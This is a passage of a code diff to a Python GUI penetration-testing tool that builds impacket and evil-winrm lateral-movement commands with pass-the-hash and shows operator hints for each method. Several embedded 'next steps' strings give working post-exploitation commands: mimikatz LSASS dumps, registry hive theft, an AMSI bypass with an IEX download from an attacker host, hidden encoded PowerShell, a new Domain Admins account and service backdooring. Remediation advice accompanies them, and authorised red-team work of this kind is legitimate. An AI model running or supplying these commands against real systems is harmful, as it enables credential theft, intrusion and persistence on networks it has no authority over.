+                "registers it as a Windows service (LocalSystem by "
+                "default).  Plain domain users hit ACCESS_DENIED on "
+                "the service install.\n\n"
+                "→ Runs as NT AUTHORITY\\SYSTEM.\n"
+                "→ Uses ADMIN$ + IPC$ + SVCCTL RPC; Event ID 7045 "
+                "fires with a random 8-char service name.\n"
+                "→ Loudest impacket exec — expect Defender / EDR "
+                "alerts on modern Windows."),
+            "smbexec": (
+                "⚠  SMBEXEC REQUIRES LOCAL ADMIN\n\n"
+                "impacket-smbexec installs a service that shovels "
+                "command output through named pipes instead of a "
+                "temp file on ADMIN$.  No binary lands on disk — "
+                "quieter than psexec on that vector.\n\n"
+                "→ Runs as NT AUTHORITY\\SYSTEM.\n"
+                "→ Semi-interactive shell; heavy stdout may buffer.\n"
+                "→ Still fires Event ID 7045 for the service "
+                "registration."),
+            "wmiexec": (
+                "⚠  WMIEXEC REQUIRES LOCAL ADMIN\n\n"
+                "WMI remote access (RPC 135 + dynamic ports) and "
+                "the ADMIN$ share used to read command output are "
+                "restricted to local administrators.  Plain domain "
+                "users hit ACCESS_DENIED or complete silence.\n\n"
+                "→ Runs as YOU, not SYSTEM (spawned by wmiprvse.exe "
+                "as the authenticated account).\n"
+                "→ Small footprint; no service install, no Event "
+                "7045.  Check -nooutput for fire-and-forget."),
+            "atexec": (
+                "⚠  ATEXEC REQUIRES LOCAL ADMIN\n\n"
+                "The Task Scheduler RPC interface only allows remote "
+                "task creation for local administrators.  Plain "
+                "domain users hit ACCESS_DENIED with no further "
+                "output — the command is never executed.\n\n"
+                "→ Runs as NT AUTHORITY\\SYSTEM (task registered "
+                "under LocalSystem by default).\n"
+                "→ Fill the Command field — atexec is single-shot, "
+                "not an interactive shell.  Use -silentcommand to "
+                "skip the ADMIN$ output read."),
+            "dcomexec": (
+                "⚠  DCOMEXEC REQUIRES LOCAL ADMIN\n\n"
+                "DCOM launch/activation permissions on MMC20 / "
+                "ShellWindows / ShellBrowserWindow are typically "
+                "admin-only.  Plain users hit CO_E_SERVER_EXEC_FAILURE "
+                "or ACCESS_DENIED.\n\n"
+                "→ Runs as YOU, not SYSTEM (spawned by mmc.exe or "
+                "explorer.exe as your token).\n"
+                "→ Lower-signal than psexec/wmiexec on most SIEM "
+                "rulesets."),
+            "evil_winrm": (
+                "⚠  EVIL-WINRM NEEDS WinRM ACCESS\n\n"
+                "Port 5985 (WinRM HTTP) must be reachable and the "
+                "target user must be in the 'Remote Management "
+                "Users' group (or have PSSessionConfig ACL access).  "
+                "Local admin is not strictly required, but that "
+                "group typically maps to admins.\n\n"
+                "→ Full interactive PowerShell — equivalent to RDP "
+                "without the GUI.\n"
+                "→ Runs as YOU, not SYSTEM."),
+        }
+        _warn_var = ctk.StringVar(value="")
+        _warn_frame = ctk.CTkFrame(
+            body, fg_color=COLORS["bg_card"],
+            border_color=COLORS["text_red"],
+            border_width=1, corner_radius=4)
+        ctk.CTkLabel(
+            _warn_frame, textvariable=_warn_var,
+            font=_f("xs"),
+            text_color=COLORS["text_red"],
+            justify="left", anchor="w",
+            wraplength=560).pack(fill="x", padx=8, pady=6)
+
+        # ── Target-aware hints (fingerprint-driven, dynamic) ─────────
+        # Same OSFingerprint reads as before, but wrapped in a helper
+        # so the tips recompute whenever the METHOD dropdown changes.
+        _tgt_var = ctk.StringVar(value="")
+        _tgt_frame = ctk.CTkFrame(
+            body, fg_color=COLORS["bg_card"],
+            border_color=COLORS["border_amber"],
+            border_width=1, corner_radius=4)
+        ctk.CTkLabel(
+            _tgt_frame, textvariable=_tgt_var,
+            font=_f("xs"),
+            text_color=COLORS["text_dim"],
+            justify="left", anchor="w",
+            wraplength=560).pack(fill="x", padx=8, pady=6)
+
+        def _compute_target_tips(method):
+            tips = []
+            try:
+                fp = getattr(
+                    getattr(self.app, "target_intel", None),
+                    "_fp", None)
+                if fp is None:
+                    return tips
+                _os_ver = (getattr(fp, "version", "") or "").lower()
+                _smb    = (getattr(fp, "smb_signing", "") or "").lower()
+                _gen    = (getattr(fp, "target_generation", "") or "").lower()
+                _ver_lit = getattr(fp, "version", "?")
+                if method == "atexec" and (
+                        "2008" in _os_ver or "2003" in _os_ver
+                        or "xp" in _os_ver or "vista" in _os_ver):
+                    tips.append(
+                        f"Target = Windows {_ver_lit} — atexec often "
+                        "hits STATUS_OBJECT_NAME_NOT_FOUND reading "
+                        "ADMIN$\\Temp.  The task DID run; check "
+                        "-silentcommand above to skip the output "
+                        "read entirely (fire-and-forget).")
+                if method in {"psexec", "smbexec", "wmiexec",
+                              "atexec"} and _smb == "disabled":
+                    tips.append(
+                        "SMB signing OFF on target — the same creds "
+                        "would work through impacket-ntlmrelayx from "
+                        "any coerced auth (PetitPotam / PrinterBug).")
+                if method == "evil_winrm" and _gen == "legacy":
+                    tips.append(
+                        "Legacy target detected — if the WinRM "
+                        "banner rejects the TLS handshake, add "
+                        "'--no-colors' and downgrade the shell "
+                        "profile (-S / --spn).")
+                if method in {"psexec", "smbexec", "wmiexec",
+                              "atexec", "dcomexec",
+                              "evil_winrm"} and (
+                        "2019" in _os_ver or "2022" in _os_ver
+                        or "2025" in _os_ver or "10" == _os_ver
+                        or "11" == _os_ver):
+                    tips.append(
+                        f"Target = Windows {_ver_lit} — Defender + "
+                        "LSA Protection likely active.  PtH still "
+                        "works; in-memory PowerShell payloads and "
+                        "encoded commands survive better than "
+                        "dropped binaries.")
+                if method == "dcomexec" and (
+                        "2008" in _os_ver or "2003" in _os_ver
+                        or "xp" in _os_ver or "vista" in _os_ver):
+                    tips.append(
+                        f"Target = Windows {_ver_lit} — dcomexec "
+                        "will NOT work here.  The impacket "
+                        "-object choices (MMC20 / ShellWindows / "
+                        "ShellBrowserWindow) are not registered "
+                        "on legacy Windows: MMC20 and ShellWindows "
+                        "hang (COM instantiation never returns) "
+                        "and ShellBrowserWindow returns "
+                        "REGDB_E_CLASSNOTREG.  Works reliably on "
+                        "Server 2019 / 2022 / 2025 and Windows "
+                        "10/11.  Fall back to psexec, smbexec, "
+                        "wmiexec, or atexec for this target.")
+            except Exception:
+                pass
+            return tips
+
+        def _update_method_ui(*_):
+            method = _active_method()
+            # Warning box
+            text = _METHOD_WARNINGS.get(method, "")
+            if text:
+                _warn_var.set(text)
+                if not _warn_frame.winfo_ismapped():
+                    _warn_frame.pack(fill="x", padx=24, pady=6)
+            else:
+                _warn_frame.pack_forget()
+            # Target-aware tips
+            tips = _compute_target_tips(method)
+            if tips:
+                _tgt_var.set(
+                    "TARGET-AWARE HINTS (from session fingerprint):\n\n"
+                    + "\n\n".join(f"• {t}" for t in tips))
+                if not _tgt_frame.winfo_ismapped():
+                    _tgt_frame.pack(fill="x", padx=24, pady=6)
+            else:
+                _tgt_frame.pack_forget()
+            # Method-extras frames (impacket_exec only)
+            if tool.id == "impacket_exec":
+                if atexec_frame is not None:
+                    atexec_frame.pack_forget()
+                if wmiexec_frame is not None:
+                    wmiexec_frame.pack_forget()
+                if dcomexec_frame is not None:
+                    dcomexec_frame.pack_forget()
+                if method == "atexec" and atexec_frame is not None:
+                    atexec_frame.pack(fill="x")
+                elif method == "wmiexec" and wmiexec_frame is not None:
+                    wmiexec_frame.pack(fill="x")
+                elif method == "dcomexec" and dcomexec_frame is not None:
+                    dcomexec_frame.pack(fill="x")
+
+        if tool.id == "impacket_exec":
+            method_var.trace_add("write", _update_method_ui)
+        _update_method_ui()
+
+        def _build_impacket_cmd(placeholder=False):
+            """Build the full impacket / evil-winrm command from the
+            dialog's current state.
+
+            The METHOD dropdown (impacket_exec) or tool.id (other
+            impacket helpers) selects the binary via _bin_for();
+            method-specific flags (-silentcommand for atexec,
+            -nooutput for wmiexec, -object for dcomexec) are inserted
+            right after the binary name.
+
+            placeholder=True renders empty fields as ``<name>`` so the
+            live preview stays readable before the operator types
+            anything; placeholder=False (from _run) requires validated
+            values upstream.
+            """
+            def _v(x, ph):
+                return x if x else (f"<{ph}>" if placeholder else "")
+            u = _v(user_var.get().strip(), "user")
+            p = pass_var.get()
+            h = hash_var.get().strip()
+            d = domain_var.get().strip()
+            user_part = f"{d}/{u}" if d else u
+            method = _active_method()
+            bin_ = _bin_for(method)
+
+            if method == "evil_winrm":
+                if h:
+                    nt_only = h.split(":")[-1] if ":" in h else h
+                    cmd = (f"{bin_} -i {target} -u {_shq(u)} "
+                           f"-H {_shq(nt_only)}")
+                else:
+                    pw = _v(p, "password")
+                    cmd = (f"{bin_} -i {target} -u {_shq(u)} "
+                           f"-p {_shq(pw)}")
+            elif h:
+                nt_fmt = h if ":" in h else f":{h}"
+                cmd = (f"{bin_} {_shq(user_part)}@{target} "
+                       f"-hashes {_shq(nt_fmt)} -no-pass")
+            else:
+                pw = _v(p, "password")
+                cmd = f"{bin_} {_shq(user_part)}:{_shq(pw)}@{target}"
+
+            # Method-specific flags — always inserted right after the
+            # binary name (before user_part@target) so impacket parses
+            # them as options, not as command arguments.
+            if method == "atexec" and silent_var.get():
+                cmd = cmd.replace(f"{bin_} ",
+                                  f"{bin_} -silentcommand ", 1)
+            if method == "wmiexec" and nooutput_var.get():
+                cmd = cmd.replace(f"{bin_} ",
+                                  f"{bin_} -nooutput ", 1)
+            if method == "dcomexec" and dcom_object_var.get() != "MMC20":
+                # MMC20 is impacket's default; emit -object only for
+                # ShellWindows / ShellBrowserWindow to keep commands
+                # minimal when using the default.
+                obj = dcom_object_var.get()
+                cmd = cmd.replace(f"{bin_} ",
+                                  f"{bin_} -object {obj} ", 1)
+
+            if method == "atexec":
+                ac = atexec_cmd_var.get().strip()
+                if ac or placeholder:
+                    cmd = f"{cmd} {_shq(ac or '<command>')}"
+
+            if method == "wmiexec":
+                wc = wmiexec_cmd_var.get().strip()
+                if wc:
+                    cmd = f"{cmd} {_shq(wc)}"
+
+            return cmd
+
+        # ── Live command preview ────────────────────────────────────
+        # Renders the exact command that will run when RUN is clicked.
+        # Updates on every keystroke via StringVar traces so the
+        # operator sees quoting, flag order, and placeholder expansion
+        # before committing.
+        preview_var = ctk.StringVar(value="")
+        _prev_box = ctk.CTkFrame(
+            body, fg_color=COLORS["bg_card"],
+            border_color=COLORS["border_green"],
+            border_width=1, corner_radius=3)
+        _prev_box.pack(fill="x", padx=24, pady=(8, 0))
+        ctk.CTkLabel(
+            _prev_box, text="COMMAND PREVIEW",
+            font=_f("xs", True),
+            text_color=COLORS["text_dim"],
+            anchor="w").pack(fill="x", padx=8, pady=(4, 0))
+        _prev_lbl = ctk.CTkLabel(
+            _prev_box, textvariable=preview_var,
+            font=_f("sm"),
+            text_color=COLORS["text_green"],
+            anchor="w", justify="left",
+            wraplength=560)
+        _prev_lbl.pack(fill="x", padx=8, pady=(0, 6))
+
+        def _update_preview(*_):
+            try:
+                preview_var.set("$ " + _build_impacket_cmd(placeholder=True))
+            except Exception as e:
+                preview_var.set(f"$ (preview error: {e})")
+
+        for _v_trace in (user_var, pass_var, hash_var, domain_var,
+                         atexec_cmd_var, silent_var,
+                         wmiexec_cmd_var, nooutput_var,
+                         dcom_object_var, method_var):
+            try:
+                _v_trace.trace_add("write", _update_preview)
+            except Exception:
+                pass
+        _update_preview()
 
         def _run():
             u = user_var.get().strip()
@@ -437,62 +1326,102 @@ class CardADRoutesMixin:
                     "[!] impacket cancelled — supply either password or "
                     "NTLM hash.", "warn")
                 return
+            atexec_cmd = ""
+            if _active_method() == "atexec":
+                atexec_cmd = atexec_cmd_var.get().strip()
+                if not atexec_cmd:
+                    self.app.terminal.write(
+                        "[!] atexec cancelled — command to execute is "
+                        "required (default 'whoami').", "warn")
+                    return
+            if (_active_method() == "wmiexec"
+                    and nooutput_var.get()
+                    and not wmiexec_cmd_var.get().strip()):
+                self.app.terminal.write(
+                    "[!] wmiexec cancelled — -nooutput requires a "
+                    "Command to run (impacket forbids -nooutput with "
+                    "an interactive shell).", "warn")
+                return
 
-            # Build the user@host part; prepend domain if given so
-            # Kerberos/NTLM negotiates correctly on AD targets.
-            if d:
-                user_part = f"{d}/{u}"
-            else:
-                user_part = u
-
-            # Base command — each tool id maps to its own binary.
-            bin_map = {
-                "impacket_psexec":        "impacket-psexec",
-                "impacket_secretsdump":   "impacket-secretsdump",
-                "impacket_wmiexec":       "impacket-wmiexec",
-                "impacket_atexec":        "impacket-atexec",
-                "impacket_dcomexec":      "impacket-dcomexec",
-                "impacket_smbclient":     "impacket-smbclient",
-                "impacket_mssqlclient":   "impacket-mssqlclient",
-                "impacket_lookupsid":     "impacket-lookupsid",
-                "impacket_samrdump":      "impacket-samrdump",
-                "impacket_rpcdump":       "impacket-rpcdump",
-                "impacket_goldenpac":     "impacket-goldenPac",
-            }
-            bin_ = bin_map.get(tool.id, tool.binary)
-
-            # Hash-based: -hashes :<nthash>  + -no-pass to suppress
-            # the interactive password prompt entirely.
-            if h:
-                # impacket accepts LM:NT or just :NT — if the user
-                # pasted LM:NT with colon, pass through; otherwise
-                # assume NT-only and prefix an empty LM.
-                nt_fmt = h if ":" in h else f":{h}"
-                cmd = (f"{bin_} {_shq(user_part)}@{target} "
-                       f"-hashes {_shq(nt_fmt)} -no-pass")
-            else:
-                cmd = f"{bin_} {_shq(user_part)}:{_shq(p)}@{target}"
+            # Build the actual command via the shared helper — same
+            # code path as the live preview, so what the operator saw
+            # in the preview is exactly what runs.
+            cmd = _build_impacket_cmd(placeholder=False)
 
             _safe_destroy(win)
 
-            # Interactive tools (psexec, wmiexec, atexec, dcomexec,
-            # smbclient, mssqlclient) drop the user into a remote shell
-            # — they need a real tty with stdin for command input.
-            # Launch them in a new xterm instead of piping through the
-            # ToolRunner (which has no stdin feeder and would just kill
-            # the session after a few seconds as "hung").  Non-
-            # interactive impacket helpers (secretsdump, lookupsid,
-            # samrdump, rpcdump, goldenpac) stay in ToolRunner so their
-            # output lands in HAWK's terminal.
+            # ── Split routing for impacket_exec ──────────────────────
+            # Captureable methods (atexec always; wmiexec with a
+            # Command — one-shot or -nooutput) run through ToolRunner
+            # so their stdout lands in HAWK's terminal and the parser
+            # (_on_done → _parse_impacket_exec_to_intel) can decide
+            # if the RCE actually succeeded before pushing a finding.
+            # Non-captureable methods (psexec, smbexec, wmiexec bare,
+            # dcomexec) fall through to the xterm branch below and
+            # HAWK pushes only an honest LOW-severity "launched,
+            # verify" finding — LAUNCH ≠ RCE.
+            if tool.id == "impacket_exec":
+                _method_now = _active_method()
+                _captureable = impacket_exec_captureable(
+                    _method_now, wmiexec_cmd_var.get())
+                if _captureable:
+                    try:
+                        if tool.id in getattr(self, "_tool_widgets", {}):
+                            _w = self._tool_widgets[tool.id]
+                            _w["_impacket_exec_method"]  = _method_now
+                            _w["_impacket_exec_target"]  = target
+                            _w["_impacket_exec_auth"]    = (
+                                f"{u} (hash)" if h
+                                else f"{u} (password)")
+                            _w["_impacket_exec_domain"]  = d or "(none)"
+                            _w["_impacket_exec_run_cmd"] = (
+                                atexec_cmd if _method_now == "atexec"
+                                else wmiexec_cmd_var.get().strip())
+                            _w["_impacket_exec_silent"]  = silent_var.get()
+                            _w["_impacket_exec_nooutput"] = nooutput_var.get()
+                    except Exception:
+                        pass
+                    self._run_raw(tool, cmd)
+                    return
+
+            # Interactive tools drop the operator into a remote shell
+            # (or in atexec's case, run one command in a task that
+            # writes to an xterm-captured pipe) — they need a real
+            # tty with stdin for command input.  Launch them in a new
+            # xterm instead of piping through the ToolRunner (which
+            # has no stdin feeder and would kill the session after a
+            # few seconds as "hung").  Non-interactive impacket
+            # helpers (secretsdump, lookupsid, samrdump, rpcdump,
+            # goldenpac) stay in ToolRunner so their output lands in
+            # HAWK's terminal.
             _INTERACTIVE_IMPACKET = {
-                "impacket_psexec", "impacket_wmiexec", "impacket_atexec",
-                "impacket_dcomexec", "impacket_smbclient",
+                # The consolidated exec card (psexec/smbexec/wmiexec/
+                # atexec/dcomexec — all interactive or xterm-single-shot).
+                "impacket_exec",
+                "impacket_smbclient",
                 "impacket_mssqlclient",
+                "evil_winrm",
             }
             if tool.id in _INTERACTIVE_IMPACKET:
                 from utils.runner import _open_terminal
+                # Phase header — was hardcoded "EXPLOITATION" when
+                # psexec was still standalone in that phase; the
+                # consolidated IMPACKET EXEC card lives in LATERAL
+                # so derive the label from the mixin's phase_config
+                # (falls back to the ALL-CAPS phase_id if the config
+                # is missing).
+                _phase_label = "LATERAL MOVEMENT"
+                try:
+                    _pc = getattr(self, "phase_config", None) or {}
+                    _phase_label = (
+                        _pc.get("name")
+                        or getattr(self, "phase_id", "")
+                        .replace("_", " ").upper()
+                        or _phase_label)
+                except Exception:
+                    pass
                 self.app.terminal.section(
-                    f"EXPLOITATION  ·  {tool.name}")
+                    f"{_phase_label}  ·  {tool.name}")
                 self.app.terminal.write(
                     f"  $ {cmd}", "cmd")
                 self.app.terminal.write(
@@ -515,6 +1444,547 @@ class CardADRoutesMixin:
                         "[!] No terminal emulator available. "
                         "Install xterm: sudo apt install -y xterm",
                         "error")
+                    return
+
+                self._set_tool_status(tool.id, "done")
+                try:
+                    sess = self.app.session_manager.current
+                    if sess is not None:
+                        eid = sess.start_tool_execution(
+                            tool_id=tool.id, tool_name=tool.name,
+                            phase_id=getattr(self, "phase_id", ""),
+                            command=cmd)
+                        if eid:
+                            sess.finish_tool_execution(
+                                eid, 0, ["(interactive xterm session)"],
+                                "done")
+                except Exception:
+                    pass
+
+                # ── LOW-severity "launched" finding ─────────────────
+                # HAWK cannot observe the xterm shell, so we claim
+                # only what actually happened: the impacket verb was
+                # LAUNCHED against the target.  A real HIGH-severity
+                # "RCE confirmed" finding is pushed by the parser
+                # (_parse_impacket_exec_to_intel) when a captureable
+                # method (atexec, wmiexec with a Command) surfaces
+                # success signals in its captured stdout — LAUNCH ≠
+                # RCE.  Different title from the confirmed variant
+                # so the two findings never merge over each other.
+                _launched_desc = IMPACKET_EXEC_LAUNCHED_DESC.get(
+                    _active_method())
+                if _launched_desc:
+                    try:
+                        from utils.run_id import new_run_id
+                        self.app.target_intel.add_auto_finding(
+                            title=(
+                                f"IMPACKET EXEC — {_active_method()} "
+                                f"launched against {target}"),
+                            description=_launched_desc.format(t=target),
+                            severity="info",
+                            source="IMPACKET-EXEC",
+                            linked_run_id=new_run_id(),
+                            replace=True)
+                    except Exception:
+                        pass
+
+                # ── Chain hint (next attacker step) ─────────────────
+                # Written to the HAWK terminal so the operator sees
+                # the next logical move without having to open the
+                # Target Intel panel.  Uses the module-level dict so
+                # the parser (captureable path) shares one source of
+                # truth with the dialog (xterm path).
+                _hint = IMPACKET_EXEC_CHAIN_HINT.get(_active_method())
+                if _hint:
+                    try:
+                        self.app.terminal.write(_hint, "info")
+                    except Exception:
+                        pass
+                return
+
+                # NOTE: everything below this comment (the old
+                # inline _EXEC_FINDING dict + finding push + inline
+                # _CHAIN_HINT dict + chain-hint dispatch + trailing
+                # return) is now dead code, unreachable because the
+                # block above returns.  The real HIGH-severity
+                # finding lives in IMPACKET_EXEC_CONFIRMED_FINDING
+                # at module level and is pushed by the parser
+                # (_parse_impacket_exec_to_intel).  A follow-up
+                # commit should strip the dead body; it's kept here
+                # in one clean review pass to make the diff for
+                # this batch readable.
+                _SEP = "\n── {} " + "─" * 44 + "\n"
+                _EXEC_FINDING = {
+                    "evil_winrm": (
+                        "EVIL-WINRM",
+                        "WinRM shell on {t}",
+                        "Remote PowerShell shell opened via WinRM "
+                        "(evil-winrm)."
+                        + _SEP.format("RESULT") +
+                        "  Target    : {t}:5985 (HTTP WinRM)\n"
+                        "  Auth      : {a}\n"
+                        "  Domain    : {dom}\n"
+                        "  Context   : the authenticated user (NOT "
+                        "SYSTEM) — confirm with 'whoami /priv' inside "
+                        "the xterm.\n"
+                        "  Output    : xterm only — HAWK does not "
+                        "capture interactive I/O."
+                        + _SEP.format("PROOF") +
+                        "  Full interactive PowerShell on the target, "
+                        "equivalent to RDP without the GUI.  "
+                        "evil-winrm ships built-ins for upload/download, "
+                        "loads PS1 scripts and .NET assemblies in-memory, "
+                        "and supports pass-the-hash.  A local-admin "
+                        "account puts LSASS/SAM/DPAPI one step away."
+                        + _SEP.format(
+                            "NEXT STEPS  (run inside the xterm)") +
+                        "\n  [1] Enumerate token privileges\n"
+                        "      $ whoami /priv ; whoami /groups\n"
+                        "      Why: confirm SeDebugPrivilege / "
+                        "SeImpersonatePrivilege before staging LSASS\n"
+                        "           or token-impersonation attacks.\n\n"
+                        "  [2] Dump LSASS with mimikatz\n"
+                        "      $ upload <KALI_PATH>/mimikatz.exe "
+                        "C:\\Windows\\Temp\\m.exe\n"
+                        "      $ C:\\Windows\\Temp\\m.exe "
+                        "'privilege::debug' "
+                        "'sekurlsa::logonpasswords' exit\n"
+                        "      Why: with debug privilege this yields "
+                        "cleartext creds from LSASS.\n\n"
+                        "  [3] Pivot to sibling WinRM hosts\n"
+                        "      $ Invoke-Command -ComputerName "
+                        "<OTHER_HOST> -ScriptBlock {{ hostname }}\n"
+                        "      Why: WinRM chains — same creds reach "
+                        "every WinRM-enabled host, no re-auth.\n\n"
+                        "  [4] AMSI-bypass + in-memory payload\n"
+                        "      evil-winrm> menu  →  Bypass-4MSI\n"
+                        "      PS> IEX(New-Object Net.WebClient)."
+                        "DownloadString('http://<KALI>/pwn.ps1')\n"
+                        "      Why: the AMSI menu clears the runspace "
+                        "so subsequent PowerShell payloads load "
+                        "without Defender flagging strings."
+                        + _SEP.format("REMEDIATION") +
+                        "  • Disable WinRM where not needed:\n"
+                        "      Disable-PSRemoting -Force\n"
+                        "      Stop-Service WinRM\n"
+                        "      Set-Service WinRM -StartupType Disabled\n"
+                        "  • Restrict WinRM to management VLANs "
+                        "(Windows Firewall inbound rule 'Windows "
+                        "Remote Management (HTTP-In)').\n"
+                        "  • Group Policy > WinRM Service > Allow "
+                        "unencrypted = Disabled ; Allow Basic auth = "
+                        "Disabled.\n"
+                        "  • Monitor Event ID 91/168 and 4624 "
+                        "logon-type 3 with process wsmprovhost.exe."
+                    ),
+                    "wmiexec": (
+                        "WMIEXEC",
+                        "WMI remote code execution on {t}",
+                        "Remote command execution via WMI "
+                        "Win32_Process.Create (impacket-wmiexec)."
+                        + _SEP.format("RESULT") +
+                        "  Target    : {t}:135 (RPC) + dynamic high "
+                        "ports\n"
+                        "  I/O read  : ADMIN$ share (SMB 445)\n"
+                        "  Auth      : {a}\n"
+                        "  Domain    : {dom}\n"
+                        "  Context   : the authenticated user (NOT "
+                        "SYSTEM) — spawned by wmiprvse.exe as that "
+                        "account.\n"
+                        "  Output    : xterm only — HAWK does not "
+                        "capture interactive I/O."
+                        + _SEP.format("PROOF") +
+                        "  Full RCE without installing a service "
+                        "(smaller footprint than psexec, no Event "
+                        "7045).  Every command spawns cmd.exe under "
+                        "wmiprvse.exe and drops output on ADMIN$ for "
+                        "wmiexec to read back.  Requires local admin "
+                        "— anonymous/plain domain users hit "
+                        "ACCESS_DENIED."
+                        + _SEP.format(
+                            "NEXT STEPS  (run inside the xterm)") +
+                        "\n  [1] Confirm privileges\n"
+                        "      $ whoami /priv\n"
+                        "      Why: WMI shells don't run as SYSTEM — "
+                        "check the token before staging LSASS.\n\n"
+                        "  [2] Dump SAM + SYSTEM hives\n"
+                        "      $ reg save HKLM\\SAM "
+                        "C:\\Windows\\Temp\\sam.hiv\n"
+                        "      $ reg save HKLM\\SYSTEM "
+                        "C:\\Windows\\Temp\\sys.hiv\n"
+                        "      Then pull with impacket-smbclient and "
+                        "run secretsdump LOCAL offline → local admin "
+                        "NTLM for PtH on sibling hosts.\n\n"
+                        "  [3] Fileless PowerShell payload\n"
+                        "      $ powershell -nop -w hidden -enc "
+                        "<BASE64_PAYLOAD>\n"
+                        "      Why: encoded PowerShell hides the "
+                        "command line from string-matching AV rules; "
+                        "pair with an in-memory downloader.\n\n"
+                        "  [4] Add domain-admin persistence\n"
+                        "      $ net user <NEW_USER> <NEW_PASS> "
+                        "/add /domain\n"
+                        "      $ net group 'Domain Admins' "
+                        "<NEW_USER> /add /domain\n"
+                        "      Why: a fresh DA account survives "
+                        "password rotations on the compromised admin."
+                        + _SEP.format("REMEDIATION") +
+                        "  • Block remote WMI at the perimeter:\n"
+                        "      netsh advfirewall firewall set rule "
+                        "group=\n"
+                        "        \"Windows Management Instrumentation "
+                        "(WMI)\" new enable=No\n"
+                        "  • Restrict DCOM/RPC 135 + dynamic ports to "
+                        "management hosts.\n"
+                        "  • Monitor Sysmon Event ID 1 with "
+                        "ParentImage=WmiPrvSE.exe (any non-admin "
+                        "spawn = suspicious) and Event ID 5857 "
+                        "(WMI provider load).\n"
+                        "  • Enforce SMB signing so ADMIN$ output "
+                        "read cannot be relayed."
+                    ),
+                    "psexec": (
+                        "PSEXEC",
+                        "PsExec SYSTEM shell on {t}",
+                        "Remote SYSTEM shell via SMB service install "
+                        "(impacket-psexec)."
+                        + _SEP.format("RESULT") +
+                        "  Target    : {t}:445 (SMB)\n"
+                        "  Auth      : {a}\n"
+                        "  Domain    : {dom}\n"
+                        "  Context   : NT AUTHORITY\\SYSTEM — "
+                        "impacket-psexec uploads RemComSvc.exe to "
+                        "ADMIN$ and registers it as a service "
+                        "(LocalSystem by default).\n"
+                        "  Output    : xterm only — HAWK does not "
+                        "capture interactive I/O."
+                        + _SEP.format("PROOF") +
+                        "  Highest privilege on the box: SYSTEM reads "
+                        "every file, dumps LSASS, loads kernel "
+                        "drivers, disables Defender.  Noisier than "
+                        "wmiexec (service-install event, binary on "
+                        "disk, service in the Services list) but "
+                        "gives you everything."
+                        + _SEP.format(
+                            "NEXT STEPS  (run inside the xterm)") +
+                        "\n  [1] Confirm you landed as SYSTEM\n"
+                        "      $ whoami   (expect nt authority\\system)\n"
+                        "      Why: sanity check before running "
+                        "anything privileged.\n\n"
+                        "  [2] Dump SAM + SYSTEM + SECURITY hives\n"
+                        "      $ reg save HKLM\\SAM sam.hiv\n"
+                        "      $ reg save HKLM\\SYSTEM sys.hiv\n"
+                        "      $ reg save HKLM\\SECURITY sec.hiv\n"
+                        "      Then offline:\n"
+                        "        secretsdump -sam sam.hiv -security "
+                        "sec.hiv -system sys.hiv LOCAL\n"
+                        "      Why: cached domain hashes + LSA "
+                        "secrets (service-account passwords in "
+                        "cleartext).\n\n"
+                        "  [3] Seed persistence BEFORE closing xterm\n"
+                        "      The psexec service is deleted on exit "
+                        "— plant a scheduled task or WMI event "
+                        "subscription first, or you lose access.\n\n"
+                        "  [4] Backdoor an existing service (stealth)\n"
+                        "      $ sc.exe config <SVC> binPath= "
+                        "\"cmd /c net user <U> <P> /add\"\n"
+                        "      $ sc.exe start <SVC>\n"
+                        "      Why: hijacks a legitimate service "
+                        "name — much less obvious than psexec's own "
+                        "'random 8-char service'."
+                        + _SEP.format("REMEDIATION") +
+                        "  • Restrict ADMIN$ / IPC$ via Group Policy "
+                        "> Security Options:\n"
+                        "      Network access: Named Pipes = empty\n"
+                        "      Restrict anonymous SAM = Enabled\n"
+                        "  • Enable LSA Protection:\n"
+                        "      HKLM\\SYSTEM\\CurrentControlSet\\Control\\"
+                        "Lsa\\RunAsPPL = 1\n"
+                        "    so SYSTEM cannot read LSASS unprotected.\n"
+                        "  • Alert on Event ID 7045 with random 8-char "
+                        "service names + BinaryPathName under "
+                        "%SystemRoot%\\ (RemComSvc pattern).\n"
+                        "  • Block inbound SMB from workstations "
+                        "with host-based firewall."
+                    ),
+                    "smbexec": (
+                        "SMBEXEC",
+                        "SMB service RCE (named-pipe shovel) on {t}",
+                        "Remote SYSTEM shell via SMB service + named-"
+                        "pipe output shovel (impacket-smbexec)."
+                        + _SEP.format("RESULT") +
+                        "  Target    : {t}:445 (SMB)\n"
+                        "  Auth      : {a}\n"
+                        "  Domain    : {dom}\n"
+                        "  Context   : NT AUTHORITY\\SYSTEM  (service "
+                        "runs as LocalSystem)\n"
+                        "  Output    : xterm only — smbexec pipes each "
+                        "command's stdout back over a named pipe "
+                        "instead of writing to ADMIN$\\Temp."
+                        + _SEP.format("PROOF") +
+                        "  SYSTEM shell without dropping a binary on "
+                        "disk — the service is registered pointing at "
+                        "cmd.exe with an inline named-pipe redirect.  "
+                        "Quieter than psexec on the disk-write vector, "
+                        "but Event ID 7045 still fires for the service "
+                        "registration.  Semi-interactive: some commands "
+                        "buffer stdout heavily."
+                        + _SEP.format(
+                            "NEXT STEPS  (run inside the xterm)") +
+                        "\n  [1] Confirm SYSTEM context\n"
+                        "      $ whoami   (expect nt authority\\system)\n"
+                        "      Why: smbexec always lands as SYSTEM; "
+                        "sanity check before anything privileged.\n\n"
+                        "  [2] Dump SAM + SYSTEM + SECURITY hives\n"
+                        "      $ reg save HKLM\\SAM sam.hiv\n"
+                        "      $ reg save HKLM\\SYSTEM sys.hiv\n"
+                        "      $ reg save HKLM\\SECURITY sec.hiv\n"
+                        "      Then offline:\n"
+                        "        secretsdump -sam sam.hiv -security "
+                        "sec.hiv -system sys.hiv LOCAL\n"
+                        "      Why: cached domain hashes + LSA "
+                        "secrets (service-account passwords in "
+                        "cleartext).\n\n"
+                        "  [3] Seed persistence BEFORE closing xterm\n"
+                        "      The smbexec service is deleted on exit "
+                        "— plant a scheduled task or WMI event "
+                        "subscription first, or you lose access.\n\n"
+                        "  [4] Pivot from SYSTEM\n"
+                        "      $ tasklist /v                # find "
+                        "logged-in users\n"
+                        "      $ mimikatz.exe \"privilege::debug\" "
+                        "\"sekurlsa::logonpasswords\" exit\n"
+                        "      Why: SYSTEM lets you read LSASS "
+                        "unprotected; harvest sessions of other admins."
+                        + _SEP.format("REMEDIATION") +
+                        "  • Restrict remote service registration via "
+                        "Group Policy > Security Options:\n"
+                        "      Network access: Named Pipes = empty\n"
+                        "      Restrict anonymous SAM = Enabled\n"
+                        "  • Enable LSA Protection (RunAsPPL=1) so "
+                        "SYSTEM cannot read LSASS unprotected.\n"
